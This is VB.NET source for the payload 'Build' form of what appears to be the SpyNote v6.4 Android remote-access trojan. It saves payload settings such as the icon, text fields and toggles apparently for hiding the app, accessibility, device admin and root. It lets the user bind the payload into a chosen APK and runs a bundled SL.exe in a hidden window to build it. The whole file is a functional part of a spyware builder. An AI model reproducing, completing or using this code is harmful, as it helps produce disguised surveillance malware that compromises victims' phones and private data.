Imports Microsoft.VisualBasic.CompilerServices
Imports System.Drawing.Drawing2D
Imports System.IO
Imports System.Text
Imports SpyNote_V6._4.SN.SpyNote.Stores

Public Class Build
    Private sGet As String

    Private colo As Color

    Private colo1 As Color
    Public Sub New()
        Me.sGet = Nothing
        Me.colo = Color.FromArgb(57, 57, 58)
        Me.colo1 = Color.FromArgb(27, 27, 28)
        Me.InitializeComponent()
    End Sub

    Private Sub Build_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\16.ico"))
        Me.TextBox1.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox2.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox3.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox4.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox5.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox6.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox7.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TextBox8.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.PictureBox2.Image = Store.Bitmap_0("\Payload\b0")
        Dim flag As Boolean = False
        Dim environmentVariable As String = Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.User)
        If (environmentVariable IsNot Nothing) Then
            flag = If(Not My.Computer.FileSystem.DirectoryExists(environmentVariable), True, False)
        End If
        If (Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.User) Is Nothing Or flag) Then
            My.Forms.JV.ShowDialog()
            If (My.Forms.JV.DialogResult <> System.Windows.Forms.DialogResult.OK) Then
                My.Forms.JV.Close()
                MyBase.Close()
            Else
                Dim text As String = Nothing
                Try
                    text = My.Forms.JV.aFileName.Text
                    text = (New FileInfo(text)).DirectoryName
                Catch exception As System.Exception
                    ProjectData.SetProjectError(exception)
                    My.Forms.JV.Close()
                    MyBase.Close()
                    ProjectData.ClearProjectError()
                End Try
                Environment.SetEnvironmentVariable("Path", text, EnvironmentVariableTarget.User)
                My.Forms.JV.Close()
            End If
        End If
        Dim str As String = String.Concat(Store.Resources(1), "\Imports\Payload\s.inf")
        Dim strArrays As String() = File.ReadAllLines(str)
        If (CInt(strArrays.Length) >= 10) Then
            Dim length As Integer = CInt(strArrays.Length)
            Dim num As Integer = 0
            While num <= length
                If (num <= 10) Then
                    Select Case num
                        Case 0
                            If (Not File.Exists(strArrays(num))) Then
                                Dim str1 As String = String.Concat(Store.Resources(1), "\Icons\devico\gp.png")
                                If (File.Exists(str1)) Then
                                    Me.PictureBox1.ImageLocation = str1
                                    Me.Label1.Tag = str1
                                    Me.ThemeButton1.Tag = "0"
                                    Me.ThemeButton1.Text = "Select icon"
                                    Me.Label1.Text = "default"
                                End If
                            Else
                                Me.PictureBox1.ImageLocation = strArrays(num)
                                Me.Label1.Tag = strArrays(num)
                                Dim str2 As String = String.Concat(Store.Resources(1), "\Icons\devico\gp.png")
                                If (Operators.CompareString(strArrays(num), str2, False) <> 0) Then
                                    Me.ThemeButton1.Text = "Delete"
                                    Me.Label1.Text = strArrays(num)
                                    Me.ThemeButton1.Tag = "1"
                                Else
                                    Me.ThemeButton1.Text = "Select icon"
                                    Me.Label1.Text = "default"
                                    Me.ThemeButton1.Tag = "0"
                                End If
                            End If
                            Exit Select
                        Case 1
                            Me.TextBox1.Text = strArrays(num)
                            Exit Select
                        Case 2
                            Me.TextBox2.Text = strArrays(num)
                            Exit Select
                        Case 3
                            Me.TextBox3.Text = strArrays(num)
                            Exit Select
                        Case 4
                            Me.TextBox4.Text = strArrays(num)
                            Exit Select
                        Case 5
                            Me.TextBox5.Text = strArrays(num)
                            Exit Select
                        Case 6
                            Me.TextBox6.Text = strArrays(num)
                            Exit Select
                        Case 7
                            If (Operators.CompareString(strArrays(num), "null", False) <> 0) Then
                                Me.TextBox7.Enabled = True
                                Me.Pi6.Tag = "OK"
                                Me.TextBox7.Text = strArrays(num)
                            Else
                                Me.TextBox7.Enabled = False
                                Me.Pi6.Tag = "-"
                                Me.TextBox7.Text = strArrays(num)
                            End If
                            Exit Select
                        Case 8
                            If (strArrays(num)(0) = "1"c) Then
                                Me.c1()
                            End If
                            If (strArrays(num)(1) = "1"c) Then
                                Me.c2()
                            End If
                            If (strArrays(num)(2) = "1"c) Then
                                Me.c3()
                            End If
                            If (strArrays(num)(3) = "1"c) Then
                                Me.c4()
                            End If
                            If (strArrays(num)(4) = "1"c) Then
                                Me.c5()
                            End If
                            Exit Select
                        Case 9
                            If (Not File.Exists(strArrays(num))) Then
                                Me.Label14.Text = ".."
                                Me.TextBox8.Enabled = False
                                Me.TextBox8.Text = ".."
                                Me.Label15.Enabled = False
                                Me.ThemeButton3.Tag = "0"
                                Me.ThemeButton3.Text = "Select File"
                            Else
                                Me.Label14.Text = strArrays(num)
                                Me.TextBox8.Enabled = True
                                Me.Label15.Enabled = True
                                Me.ThemeButton3.Tag = "1"
                                Me.ThemeButton3.Text = "Delete"
                            End If
                            Exit Select
                        Case 10
                            If (Not Operators.ConditionalCompareObjectEqual(Me.ThemeButton3.Tag, "0", False)) Then
                                Me.TextBox8.Text = strArrays(num)
                            Else
                                Me.TextBox8.Text = ".."
                            End If
                            Exit Select
                    End Select
                    num = num + 1
                Else
                    Exit While
                End If
            End While
        End If
        Me.PBil.ImageLocation = String.Concat(Store.Resources(1), "\Icons\Payload\Bi.png")
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub

    Public Sub c1()
        If (Not Operators.ConditionalCompareObjectEqual(Me.Pi1.Tag, "OK", False)) Then
            Me.LED1.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LED1.Colour1 = Color.FromArgb(30, 145, 255)
            Me.LEDHID.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LEDHID.Colour1 = Color.FromArgb(30, 145, 255)
            Me.Pi1.Tag = "OK"
        Else
            If (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.NotObject(Operators.CompareObjectEqual(Me.Pi2.Tag, "OK", False)), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi3.Tag, "OK", False))), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi4.Tag, "OK", False))), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi5.Tag, "OK", False))))) Then
                Me.LED1.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED1.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED2.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED2.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED3.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED3.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED4.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED4.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED5.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED5.Colour1 = Color.FromArgb(0, 0, 0)
            End If
            Me.LEDHID.Colour0 = Color.FromArgb(0, 0, 0)
            Me.LEDHID.Colour1 = Color.FromArgb(0, 0, 0)
            Me.Pi1.Tag = "-"
        End If
        Me.chAll()
        Me.Panel5.Refresh()
    End Sub

    Public Sub c2()
        If (Not Operators.ConditionalCompareObjectEqual(Me.Pi2.Tag, "OK", False)) Then
            Me.LED1.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LED1.Colour1 = Color.FromArgb(30, 145, 255)
            Me.LED2.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LED2.Colour1 = Color.FromArgb(30, 145, 255)
            Me.LEDACC0.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LEDACC0.Colour1 = Color.FromArgb(30, 145, 255)
            Me.Pi2.Tag = "OK"
        Else
            If (Operators.ConditionalCompareObjectEqual(Me.Pi3.Tag, "OK", False)) Then
                Me.LEDACC1.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LEDACC1.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LEDACC2.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LEDACC2.Colour1 = Color.FromArgb(0, 0, 0)
                Me.Pi3.Tag = "-"
            End If
            If (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.NotObject(Operators.CompareObjectEqual(Me.Pi1.Tag, "OK", False)), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi3.Tag, "OK", False))), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi4.Tag, "OK", False))), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi5.Tag, "OK", False))))) Then
                Me.LED1.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED1.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED2.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED2.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED3.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED3.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED4.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED4.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED5.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED5.Colour1 = Color.FromArgb(0, 0, 0)
            ElseIf (Conversions.ToBoolean(Operators.AndObject(Operators.NotObject(Operators.CompareObjectEqual(Me.Pi4.Tag, "OK", False)), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi5.Tag, "OK", False))))) Then
                Me.LED2.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED2.Colour1 = Color.FromArgb(0, 0, 0)
            End If
            Me.LEDACC0.Colour0 = Color.FromArgb(0, 0, 0)
            Me.LEDACC0.Colour1 = Color.FromArgb(0, 0, 0)
            Me.Pi2.Tag = "-"
        End If
        Me.chAll()
        Me.Panel5.Refresh()
    End Sub

    Public Sub c3()
        If (Operators.ConditionalCompareObjectEqual(Me.Pi2.Tag, "OK", False)) Then
            If (Not Operators.ConditionalCompareObjectEqual(Me.Pi3.Tag, "OK", False)) Then
                Me.LEDACC1.Colour0 = Color.FromArgb(30, 145, 255)
                Me.LEDACC1.Colour1 = Color.FromArgb(30, 145, 255)
                Me.LEDACC2.Colour0 = Color.FromArgb(30, 145, 255)
                Me.LEDACC2.Colour1 = Color.FromArgb(30, 145, 255)
                Me.Pi3.Tag = "OK"
            Else
                Me.LEDACC1.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LEDACC1.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LEDACC2.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LEDACC2.Colour1 = Color.FromArgb(0, 0, 0)
                Me.Pi3.Tag = "-"
            End If
        End If
        Me.chAll()
        Me.Panel5.Refresh()
    End Sub

    Public Sub c4()
        If (Not Operators.ConditionalCompareObjectEqual(Me.Pi4.Tag, "OK", False)) Then
            Me.LEDDEV.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LEDDEV.Colour1 = Color.FromArgb(30, 145, 255)
            Me.LED1.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LED1.Colour1 = Color.FromArgb(30, 145, 255)
            Me.LED2.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LED2.Colour1 = Color.FromArgb(30, 145, 255)
            Me.LED3.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LED3.Colour1 = Color.FromArgb(30, 145, 255)
            Me.LED4.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LED4.Colour1 = Color.FromArgb(30, 145, 255)
            Me.Pi4.Tag = "OK"
        Else
            If (Not Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.NotObject(Operators.CompareObjectEqual(Me.Pi1.Tag, "OK", False)), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi2.Tag, "OK", False))), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi3.Tag, "OK", False))), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi5.Tag, "OK", False))))) Then
                If (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.Pi5.Tag, "OK", False)))) Then
                    Me.LED3.Colour0 = Color.FromArgb(0, 0, 0)
                    Me.LED3.Colour1 = Color.FromArgb(0, 0, 0)
                    Me.LED4.Colour0 = Color.FromArgb(0, 0, 0)
                    Me.LED4.Colour1 = Color.FromArgb(0, 0, 0)
                    Me.LED5.Colour0 = Color.FromArgb(0, 0, 0)
                    Me.LED5.Colour1 = Color.FromArgb(0, 0, 0)
                End If
                If (Conversions.ToBoolean(Operators.AndObject(Operators.NotObject(Operators.CompareObjectEqual(Me.Pi2.Tag, "OK", False)), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi5.Tag, "OK", False))))) Then
                    Me.LED2.Colour0 = Color.FromArgb(0, 0, 0)
                    Me.LED2.Colour1 = Color.FromArgb(0, 0, 0)
                End If
            Else
                Me.LED1.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED1.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED2.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED2.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED3.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED3.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED4.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED4.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED5.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED5.Colour1 = Color.FromArgb(0, 0, 0)
            End If
            Me.LEDDEV.Colour0 = Color.FromArgb(0, 0, 0)
            Me.LEDDEV.Colour1 = Color.FromArgb(0, 0, 0)
            Me.Pi4.Tag = "-"
        End If
        Me.chAll()
        Me.Panel5.Refresh()
    End Sub

    Public Sub c5()
        If (Not Operators.ConditionalCompareObjectEqual(Me.Pi5.Tag, "OK", False)) Then
            Me.LEDDROOT.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LEDDROOT.Colour1 = Color.FromArgb(30, 145, 255)
            Me.LED1.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LED1.Colour1 = Color.FromArgb(30, 145, 255)
            Me.LED2.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LED2.Colour1 = Color.FromArgb(30, 145, 255)
            Me.LED3.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LED3.Colour1 = Color.FromArgb(30, 145, 255)
            Me.LED4.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LED4.Colour1 = Color.FromArgb(30, 145, 255)
            Me.LED5.Colour0 = Color.FromArgb(30, 145, 255)
            Me.LED5.Colour1 = Color.FromArgb(30, 145, 255)
            Me.Pi5.Tag = "OK"
        Else
            If (Not Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.NotObject(Operators.CompareObjectEqual(Me.Pi1.Tag, "OK", False)), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi2.Tag, "OK", False))), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi3.Tag, "OK", False))), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi4.Tag, "OK", False))))) Then
                If (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.Pi4.Tag, "OK", False)))) Then
                    Me.LED3.Colour0 = Color.FromArgb(0, 0, 0)
                    Me.LED3.Colour1 = Color.FromArgb(0, 0, 0)
                    Me.LED4.Colour0 = Color.FromArgb(0, 0, 0)
                    Me.LED4.Colour1 = Color.FromArgb(0, 0, 0)
                End If
                If (Conversions.ToBoolean(Operators.AndObject(Operators.NotObject(Operators.CompareObjectEqual(Me.Pi4.Tag, "OK", False)), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi2.Tag, "OK", False))))) Then
                    Me.LED2.Colour0 = Color.FromArgb(0, 0, 0)
                    Me.LED2.Colour1 = Color.FromArgb(0, 0, 0)
                End If
            Else
                Me.LED1.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED1.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED2.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED2.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED3.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED3.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED4.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED4.Colour1 = Color.FromArgb(0, 0, 0)
                Me.LED5.Colour0 = Color.FromArgb(0, 0, 0)
                Me.LED5.Colour1 = Color.FromArgb(0, 0, 0)
            End If
            Me.LED5.Colour0 = Color.FromArgb(0, 0, 0)
            Me.LED5.Colour1 = Color.FromArgb(0, 0, 0)
            Me.LEDDROOT.Colour0 = Color.FromArgb(0, 0, 0)
            Me.LEDDROOT.Colour1 = Color.FromArgb(0, 0, 0)
            Me.Pi5.Tag = "-"
        End If
        Me.chAll()
        Me.Panel5.Refresh()
    End Sub

    Public Sub chAll()
        If (Not Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.NotObject(Operators.CompareObjectEqual(Me.Pi1.Tag, "OK", False)), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi2.Tag, "OK", False))), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi3.Tag, "OK", False))), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi4.Tag, "OK", False))), Operators.NotObject(Operators.CompareObjectEqual(Me.Pi5.Tag, "OK", False))))) Then
            Me.PictureBox2.Image = Store.Bitmap_0("\Payload\b1")
        Else
            Me.PictureBox2.Image = Store.Bitmap_0("\Payload\b0")
        End If
    End Sub
    Private Sub Pi1_Click_1(ByVal sender As Object, ByVal e As EventArgs) Handles Pi1.Click
        Me.c1()
    End Sub

    Private Sub Pi2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Pi2.Click
        Me.c2()
    End Sub

    Private Sub Pi3_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Pi3.Click
        Me.c3()
    End Sub

    Private Sub Pi4_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Pi4.Click
        Me.c4()
    End Sub

    Private Sub Pi5_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Pi5.Click
        Me.c5()
    End Sub

    Private Sub Pi6_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Pi6.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.Pi6.Tag, "OK", False)) Then
            Me.TextBox7.Enabled = True
            Me.Pi6.Tag = "OK"
            If (Operators.CompareString(Me.sGet, Nothing, False) = 0) Then
                Me.TextBox7.Text = ""
            Else
                Me.TextBox7.Text = Me.sGet
            End If
        Else
            Me.TextBox7.Enabled = False
            Me.Pi6.Tag = "-"
            If (Operators.CompareString(Me.TextBox7.Text, "null", False) <> 0) Then
                Me.sGet = Me.TextBox7.Text
            End If
            Me.TextBox7.Text = "null"
        End If
    End Sub

    Private Sub PictureBox1_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles PictureBox1.Paint
        Dim bitmap As System.Drawing.Bitmap = New System.Drawing.Bitmap(1, 1)
        If (Me.PictureBox1.Image IsNot Nothing) Then
            bitmap = New System.Drawing.Bitmap(Me.PictureBox1.Image)
        End If
        Dim hatchBrush As System.Drawing.Drawing2D.HatchBrush = New System.Drawing.Drawing2D.HatchBrush(HatchStyle.LargeCheckerBoard, Me.colo, Me.colo1)
        Dim rectangle As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 0, Me.PictureBox1.Width, Me.PictureBox1.Height)
        e.Graphics.FillRectangle(hatchBrush, rectangle)
        If (Me.PictureBox1.Image IsNot Nothing) Then
            e.Graphics.DrawImage(bitmap, New System.Drawing.Rectangle(0, 0, Me.PictureBox1.Width, Me.PictureBox1.Height))
        End If
    End Sub

    Private Sub TextBox1_KeyPress(ByVal sender As Object, ByVal e As KeyPressEventArgs) Handles TextBox1.KeyPress
        If ("+_)(*&^%$#@!~`\|\/*-<>:}{][,.?b=_;'""".Contains(Conversions.ToString(e.KeyChar))) Then
            e.Handled = True
        End If
    End Sub

    Private Sub ThemeButton1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton1.Click
        If (Operators.ConditionalCompareObjectEqual(Me.ThemeButton1.Tag, "1", False)) Then
            Dim str As String = String.Concat(Store.Resources(1), "\Icons\devico\gp.png")
            If (File.Exists(str)) Then
                Me.PictureBox1.ImageLocation = str
                Me.Label1.Tag = str
                Me.ThemeButton1.Tag = "0"
                Me.ThemeButton1.Text = "Select icon"
                Me.Label1.Text = "default"
                Return
            End If
        End If
        Dim fileBox As FileBox = New FileBox() With
        {
            .strGetFiles = "*.png*",
            .Text = "Selcted Files"
        }
        fileBox.ThemeTextBox1.Visible = False
        fileBox.Label1.Visible = False
        If (fileBox.ShowDialog() <> System.Windows.Forms.DialogResult.OK) Then
            fileBox.Close()
        ElseIf (fileBox.BoxView1.SelectedRows.Count > 0) Then
            For i As Integer = fileBox.BoxView1.SelectedRows.Count - 1 To 0 Step -1
                Dim str1 As String = Conversions.ToString(Operators.ConcatenateObject(String.Concat(fileBox.TEXTPATH.Text, "\"), fileBox.BoxView1.SelectedRows(i).Cells(1).Value))
                If (Not File.Exists(str1)) Then
                    Me.ThemeButton1.Tag = "0"
                    Me.ThemeButton1.Text = "Select icon"
                    Me.Label1.Text = "default"
                Else
                    Me.PictureBox1.ImageLocation = str1
                    Me.Label1.Text = str1
                    Me.Label1.Tag = str1
                    Me.ThemeButton1.Tag = "1"
                    Me.ThemeButton1.Text = "Delete"
                End If
            Next

        End If
        fileBox.Close()
    End Sub

    Private Sub ThemeButton2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton2.Click
        Try
            Dim stringBuilder As System.Text.StringBuilder = New System.Text.StringBuilder()
            stringBuilder.Append(Operators.ConcatenateObject(Me.Label1.Tag, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox1.Text, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox2.Text, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox3.Text, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox4.Text, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox5.Text, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox6.Text, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox7.Text, "" & vbCrLf & ""))
            Dim str As String = ""
            str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi1.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
            str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi2.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
            str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi3.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
            str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi4.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
            str = If(Not Operators.ConditionalCompareObjectEqual(Me.Pi5.Tag, "OK", False), String.Concat(str, "0"), String.Concat(str, "1"))
            stringBuilder.Append(String.Concat(str, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.Label14.Text, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox8.Text, "" & vbCrLf & ""))
            Dim str1 As String = String.Concat(Store.Resources(1), "\Imports\Payload\s.inf")
            If (File.Exists(str1)) Then
                Dim streamWriter As System.IO.StreamWriter = New System.IO.StreamWriter(str1)
                streamWriter.Write(stringBuilder.ToString())
                streamWriter.Close()
                Dim str2 As String = String.Concat(Store.Resources(1), "\Imports\Payload\SL.exe")
                If (File.Exists(str2)) Then
                    Dim str3 As String = String.Concat(Strings.Space(1), "n -160")
                    Dim processStartInfo As System.Diagnostics.ProcessStartInfo = New System.Diagnostics.ProcessStartInfo() With
                    {
                        .FileName = str2,
                        .Arguments = str3,
                        .WindowStyle = ProcessWindowStyle.Hidden
                    }
                    Dim id As Integer = Process.Start(processStartInfo).Id
                End If
                MyBase.Close()
            Else
                MyBase.Close()
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub ThemeButton3_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton3.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.ThemeButton3.Tag, "1", False)) Then
            Dim fileBox As FileBox = New FileBox() With
            {
                .strGetFiles = "*.apk*",
                .Text = "Selcted Files"
            }
            fileBox.ThemeTextBox1.Visible = False
            fileBox.Label1.Visible = False
            If (fileBox.ShowDialog() <> System.Windows.Forms.DialogResult.OK) Then
                Me.TextBox8.Enabled = False
                Me.TextBox8.Text = ".."
                Me.Label15.Enabled = False
                Me.ThemeButton3.Tag = "0"
                Me.ThemeButton3.Text = "Select File"
                Me.Label14.Text = ".."
                fileBox.Close()
            ElseIf (fileBox.BoxView1.SelectedRows.Count <= 0) Then
                Me.TextBox8.Enabled = False
                Me.TextBox8.Text = ".."
                Me.Label15.Enabled = False
                Me.ThemeButton3.Tag = "0"
                Me.ThemeButton3.Text = "Select File"
                Me.Label14.Text = ".."
            Else
                Dim count As Integer = fileBox.BoxView1.SelectedRows.Count - 1
                If (count >= 0) Then
                    Dim str As String = Conversions.ToString(Operators.ConcatenateObject(String.Concat(fileBox.TEXTPATH.Text, "\"), fileBox.BoxView1.SelectedRows(count).Cells(1).Value))
                    If (Not File.Exists(str)) Then
                        Me.TextBox8.Enabled = False
                        Me.TextBox8.Text = ".."
                        Me.Label15.Enabled = False
                        Me.ThemeButton3.Tag = "0"
                        Me.ThemeButton3.Text = "Select File"
                        Me.Label14.Text = ".."
                    Else
                        Me.TextBox8.Enabled = True
                        Me.Label15.Enabled = True
                        Me.Label14.Text = str
                        Me.ThemeButton3.Tag = "1"
                        Me.ThemeButton3.Text = "Delete"
                    End If
                End If
            End If
            fileBox.Close()
        Else
            Me.TextBox8.Enabled = False
            Me.TextBox8.Text = ".."
            Me.Label15.Enabled = False
            Me.ThemeButton3.Tag = "0"
            Me.ThemeButton3.Text = "Select File"
            Me.Label14.Text = ".."
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub
End Class